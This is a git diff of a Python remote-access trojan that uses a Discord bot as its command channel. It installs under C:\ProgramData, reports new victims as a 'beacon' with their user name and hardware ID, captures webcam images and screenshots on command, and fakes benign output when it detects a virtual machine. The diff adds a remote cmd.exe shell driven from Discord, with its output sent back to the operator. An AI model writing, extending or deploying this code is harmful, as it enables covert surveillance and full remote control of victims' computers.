@@ -1,4 +1,8 @@
 import os
+import subprocess
+import threading
+import asyncio
+from functools import partial
 import discord
 from dotenv import load_dotenv
 import ctypes
@@ -15,9 +19,11 @@ FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
 
 first_execution = False
-CHANNEL = None
 
+# default(open to commands) shell(in remote shell) pshell(in remote powershell shell)
 mode = "default"
+
+shell_process = None
 
 profile_data = None
 
@@ -45,22 +51,25 @@ async def on_ready():   # sobald der client sich mit discord verbunden hat
     print("start up")
     if first_execution:
         print("first execution")
-        # neuen channel erstellen
-        try:
+        create_channel()
+    try:
+        if not profile_data:
+
             with open("profile.json", "r") as json_file:
                 profile_data = json.load(json_file)
 
-            guild = client.guilds[0]
-            new_channel = await guild.create_text_channel(profile_data["channel_name"])
+        channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
 
-            await new_channel.send("***NEW BEACON CONNECTED***")
-            await new_channel.send(f'*user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}*')
-        except Exception as e:
-            await return_error_to_channel(e)
+        await channel.send(f"*{profile_data["user_name"]} logged on*")
+
+    except Exception as e:
+        await return_error_to_channel(e)
 
 
 @client.event
 async def on_message(message):  # wenn discord message erkannt wird
+    global mode
+    global shell_process
     # profile data laden
     global profile_data
     if not profile_data:
@@ -71,30 +80,96 @@ async def on_message(message):  # wenn discord message erkannt wird
             await return_error_to_channel(e)
 
     content = message.content
+    # nach dem channel mit richtigem namen suchen
+    channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
 
     # eigene und messages aus anderen channels aussortieren
     if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
         return
 
-    print("message received")
-    if mode == "default":
-        if content.startswith("-TP"):   # TAKE PICTURE
-            content = content.strip("-TP")
-            cam_index = 0
-            if content:
-                content = content.replace(" ", "")
-                cam_index = int(content)
-            await take_picture(cam_index)
-        elif content.startswith("-SG"):     # SCREEN GRAB
-            content = content.strip("-SG")
-            screen_index = 0
-            if content:
-                content = content.replace(" ", "")
-                screen_index = int(content)
-            await take_screenshot(screen_index)
+    # print("message received")
+    match mode:
+        case "default":
+
+            if content.startswith("-TP"):   # TAKE PICTURE
+                content = content.strip("-TP")
+                cam_index = 0
+                if content:
+                    content = content.replace(" ", "")
+                    cam_index = int(content)
+                await take_picture(cam_index)
+
+            elif content.startswith("-SG"):     # SCREEN GRAB
+                content = content.strip("-SG")
+                screen_index = 0
+                if content:
+                    content = content.replace(" ", "")
+                    screen_index = int(content)
+                await take_screenshot(screen_index)
+
+            elif content.startswith("-SHELL"):
+                mode = "shell"
+                shell_process = subprocess.Popen(
+                    ['cmd.exe'],
+                    stdin=subprocess.PIPE,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    shell=True
+                )
+                await channel.send("**CMD SHELL ACTIVE**")
+                await channel.send(f"*{os.getcwd()}*")
+
+        case "shell":
+                print(mode)
+                if content.startswith("quit"):
+                    mode = "default"
+                    if shell_process:
+                        shell_process.terminate()
+                        await channel.send("**CMD SHELL DEACTIVATED**")
+                        return
+
+                    await channel.send("**CMD SHELL TERMINATED**")
+                    return
+
+                print(content)
+
+                if shell_process:
+                    shell_process.stdin.write(content + "\n")
+                    shell_process.stdin.flush()
+
+                    # Start a new thread to read the output
+                    threading.Thread(target=send_shell_output_2_discord, daemon=True).start()
+
+def send_shell_output_2_discord():
+    global shell_process
+    channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
+
+    while True:
+        output = shell_process.stdout.readline()
+        if not output:
+            break
+        asyncio.run_coroutine_threadsafe(channel.send(output), client.loop)
+        time.sleep(0.3)
+
 
 def check_for_vm():
     return False
+
+
+async def create_channel():
+    # neuen channel erstellen
+    try:
+        with open("profile.json", "r") as json_file:
+            profile_data = json.load(json_file)
+
+        guild = client.guilds[0]
+        new_channel = await guild.create_text_channel(profile_data["channel_name"])
+
+        await new_channel.send("***NEW BEACON CONNECTED***")
+        await new_channel.send(f'*user name: {profile_data["user_name"]}\nhardware id: {profile_data["hardware_id"]}*')
+    except Exception as e:
+        await return_error_to_channel(e)
 
 
 async def return_error_to_channel(error_message):
@@ -110,6 +185,9 @@ async def return_error_to_channel(error_message):
             await channel.send("'''" + error_message + "'''")
         else:
             print("No channel")
+            print("trying to create channel")
+            await create_channel()
+
     except:
         print("error returning error")
 
@@ -164,7 +242,7 @@ async def take_screenshot(screen_index):
 
         channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
         with open("captured_screen.png", 'rb') as image_file:
-            if screen_index is 0:
+            if screen_index == 0:
                 screen_index = "ALL"    # screen index von 0 auf ALL string für besseren discord output
 
             await channel.send(content=f"**{profile_data["user_name"]}\t-\t{datetime.now()}\t-\tscreen:{screen_index}**",
@@ -225,9 +303,12 @@ def main():
     global first_execution
     # überprüfen ob fulcrum in einem vm läuft
     if check_for_vm() is True:
-        print("hello world")
+        print("start up")
         a = 1+1-42
-        print(a)
+        b = "03985027"
+        c = b + "2034"
+        print(str(a) + c)
+        print("CONNECTED")
         while True:
             time.sleep(1)
             a += 1
@@ -245,5 +326,5 @@ def main():
     # starten des discord bots
     client.run(TOKEN)
 
-
-main()
+if __name__ == '__main__':
+    main()
